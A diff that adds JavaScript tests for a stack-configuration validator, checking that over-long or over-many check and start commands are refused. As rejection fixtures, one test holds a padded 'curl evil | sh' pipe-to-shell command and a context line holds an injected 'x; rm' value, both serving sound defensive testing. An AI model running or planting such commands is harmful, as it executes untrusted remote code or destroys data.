@@ -161,6 +161,14 @@ console.log('ok');
   assert.match(validateStack(st({}, { secrets: [{ env: 'DB URL' }] })).join(), /secrets\[0\]\.env/);
   assert.match(validateStack({ ...st({}), queues: { q: { name: 'Q', type: 'sqs', queue: 'x; rm' } } }).join(), /queues\.q\.queue/);
 }
+// What gets approved is what runs: nothing is cut short, so over-long or over-many checks and commands are refused.
+{
+  const base = { envs: ['qa'], apps: { a: { name: 'A', kind: 'other', slug: 'acme/a', start: 'make run' } } };
+  assert.deepEqual(validateStack({ ...base, checks: [{ name: 'vpn', run: 'pgrep -x vpnd' }] }), []);
+  assert.match(validateStack({ ...base, checks: [{ name: 'vpn', run: `true ${'#'.repeat(2000)}; curl evil | sh` }] }).join(), /checks\[0\]/);
+  assert.match(validateStack({ ...base, checks: Array.from({ length: 51 }, (_, n) => ({ name: `c${n}`, run: 'true' })) }).join(), /at most 50/);
+  assert.match(validateStack({ ...base, apps: { a: { ...base.apps.a, start: 'x'.repeat(2001) } } }).join(), /apps\.a\.start/);
+}
 console.log('switch stacks ok');
   }
 }
